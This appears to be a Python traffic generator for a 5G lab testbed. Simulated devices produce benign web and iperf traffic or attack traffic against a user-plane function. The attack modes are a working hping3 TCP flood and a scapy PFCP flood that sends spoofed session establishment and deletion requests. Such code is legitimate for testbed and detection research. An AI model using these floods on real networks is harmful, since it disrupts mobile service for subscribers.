# Imports

from multiprocessing import Pool
import subprocess
import os
import random
import socket
import yaml
import time

from scapy.contrib.pfcp import PFCP, PFCPSessionEstablishmentRequest, PFCPSessionDeletionRequest
from scapy.all import send
from scapy.packet import Packet
from scapy.layers.inet import IP, UDP
import time
import random
import socket
import argparse

random.seed(42)

# Constants

DEST_IP=socket.gethostbyname('upf-1')
MAX_DDOS=1000
MAX_SEID=1000
PFCP_PORT=8805
BASE_IMSI=208930000000000
NUM_UES=25
TIME_LIMIT=10
HOME_DIR="/ueransim"
BINDER_DIR="/ueransim/binder"
FTP_IP="10.100.200.1"
IPERF_SERVER_IP="10.100.200.1"
FTP_PORT="2222"
TCP_FLAGS=(
    "-F",
    "-S",
    "-R",
    "-A",
    "-X",
    "-Y",
)
SITES=(
    "google.com",
    "netflix.com",
    "x.com",
    "fb.com",
    "iith.ac.in",
    "newslab.iith.ac.in",
    f"ftp://{FTP_IP}:{FTP_PORT}",
)

# Utility functions

def get_ue_ip(id: int):
    # Compute imsi
    imsi = f"imsi-{BASE_IMSI + id}"
    # Use nr-cli to get IP
    os.chdir(HOME_DIR)
    pdu_list = None

    while pdu_list is None or "PDU Session1" not in pdu_list.keys() or pdu_list["PDU Session1"]["state"] != "PS-ACTIVE":
        nr_cli_output = subprocess.run(
            ["./nr-cli", imsi, "-e", "ps-list"],
            capture_output=True,
            text=True
        )
        pdu_list = yaml.safe_load(nr_cli_output.stdout)
        continue

    # Return IP address
    return pdu_list['PDU Session1']['address']

# def establish_pdu_sesssion(id: int):
#     # Compute imsi
#     imsi = f"imsi-{BASE_IMSI + id}"
#     # Use nr-cli to get IP
#     os.chdir(HOME_DIR)
#     nr_cli_output = subprocess.run(
#         ["./nr-cli", imsi, "-e", "ps-list"],
#         capture_output=True,
#         text=True
#     )
#     pdu_list: dict[str, Any] = yaml.safe_load(nr_cli_output.stdout)
#     print(pdu_list)

#     # Establish PDU session if not present
#     if pdu_list is None or "PDU Session1" not in pdu_list.keys():
#         subprocess.run(
#             ["./nr-cli", imsi, "-e", '"ps-establish IPv4 --sst 0x01 --sd 0x010203 --dnn internet"']
#         )

# def release_pdu_session(id: int):
#     # Compute imsi
#     imsi = f"imsi-{BASE_IMSI + id}"
#     # Use nr-cli to get IP
#     os.chdir(HOME_DIR)
#     nr_cli_output = subprocess.run(
#         ["./nr-cli", imsi, "-e", "ps-list"],
#         capture_output=True,
#         text=True
#     )
#     pdu_list: dict[str, Any] = yaml.safe_load(nr_cli_output.stdout)

#     # If PDU session not present, do nothing
#     if pdu_list is None or "PDU Session1" not in pdu_list.keys():
#         return
    
#     # Delete PDU session
#     subprocess.run(
#         ["./nr-cli", imsi, "-e", "ps-release-all"]
#     )

def session_establishment_request(ip: str, seid: int) -> Packet:
    return IP(src=ip, dst=DEST_IP) / \
        UDP(sport=PFCP_PORT, dport=PFCP_PORT) / \
        PFCP(
            message_type=50,
            seid=seid
        ) / \
        PFCPSessionEstablishmentRequest()

# def session_modification_drop_request(seid: int) -> Packet:
#     return IP(src=SOURCE_IP, dst=DEST_IP) / \
#         UDP(sport=PFCP_PORT, dport=PFCP_PORT) / \
#         PFCP(
#             message_type=52,
#             seid=seid
#         ) / \
#         PFCPSessionModificationRequest(IE_List=[
#             IE_CreateFAR(IE_List=[
#                 IE_ApplyAction(DROP=1),
#                 IE_FAR_Id(id=1),
#             ]),
#         ])

# def session_modification_dupl_request(seid: int) -> Packet:
#     return IP(src=SOURCE_IP, dst=DEST_IP) / \
#         UDP(sport=PFCP_PORT, dport=PFCP_PORT) / \
#         PFCP(
#             message_type=52,
#             seid=seid
#         ) / \
#         PFCPSessionModificationRequest(IE_List=[
#             IE_CreateFAR(DUPL=1),
#         ])

def session_deletion_request(ip: str, seid: int) -> Packet:
    return IP(src=ip, dst=DEST_IP) / \
        UDP(sport=PFCP_PORT, dport=PFCP_PORT) / \
        PFCP(
            version=1,
            message_type=54,
            seid=seid
        ) / \
        PFCPSessionDeletionRequest()

# Traffic generation

def do_curl(ip: str):
    # Get random site
    site = random.choice(SITES)
    os.chdir(BINDER_DIR)

    # Run command
    try:
        subprocess.run(
            ["./nr-binder", ip, f"curl -L {site} -so /dev/null"],
            timeout=10,
        )
    except subprocess.TimeoutExpired:
        pass

def do_wget(ip: str):
    # Get random site
    site = random.choice(SITES)
    os.chdir(BINDER_DIR)
    
    # Run command
    try:
        subprocess.run(
            ["./nr-binder", ip, f"wget -q --spider {site}"],
            timeout=10,
        )
    except subprocess.TimeoutExpired:
        pass

def do_iperf(ip: str):
    # Determine whether TCP or UDP
    flag = ""
    if random.random() > 0.5:
        flag = "-u"
    tm = random.randint(1, TIME_LIMIT)
    os.chdir(BINDER_DIR)

    # Run command
    subprocess.run(
        ["./nr-binder", ip, f"iperf -c {IPERF_SERVER_IP} {flag} -t {tm}"],
    )

def do_tcp_flood(ip: str):
    # Determine flag randomly
    flag = random.choice(TCP_FLAGS)
    site = 'upf-1'
    tm = random.randint(1, TIME_LIMIT)
    os.chdir(BINDER_DIR)
    
    # Run command
    try:
        subprocess.run(
            ["./nr-binder", ip, f"hping3 --fast {flag} {site}"],
            timeout=tm
        )
    except subprocess.TimeoutExpired:
        pass
    
PFCP_PACKET_FUNCS=(
    session_establishment_request,
    session_deletion_request,
)

def do_pfcp_flood(ip: str):
    # Determine number of packets to be used
    N = random.randint(1, MAX_DDOS)
    for _ in range(N):
        # Which packet to send
        req_create_fn = random.choice(PFCP_PACKET_FUNCS)
        # Send the packet
        send(req_create_fn(ip, random.randint(1, MAX_SEID)))

BENIGN_LIST=(
    do_curl,
    do_wget,
    do_iperf
)

TCP_ATTACK_LIST=(
    do_tcp_flood,
)

PFCP_ATTACK_LIST=(
    do_pfcp_flood,
)

CHOSEN_LIST=()

ue_task_list = {
    'benign': BENIGN_LIST,
    'tcp': TCP_ATTACK_LIST,
    'pfcp': PFCP_ATTACK_LIST,
}

parser = argparse.ArgumentParser()
parser.add_argument('--type', default='benign', choices=ue_task_list.keys(), help='Type of traffic to be created by UEs')
args = parser.parse_args()

def ue_process(id: int):
    while True:
        func = random.choice(CHOSEN_LIST)
        ip = get_ue_ip(id)
        assert ip is not None, f'UE IP for {id} is {ip}'
        func(ip)
        time.sleep(random.randint(1, TIME_LIMIT))

if __name__ == "__main__":
    # Start UEs
    CHOSEN_LIST = ue_task_list[args.type]
    with Pool(NUM_UES) as p:
        p.map(ue_process, range(1, NUM_UES + 1))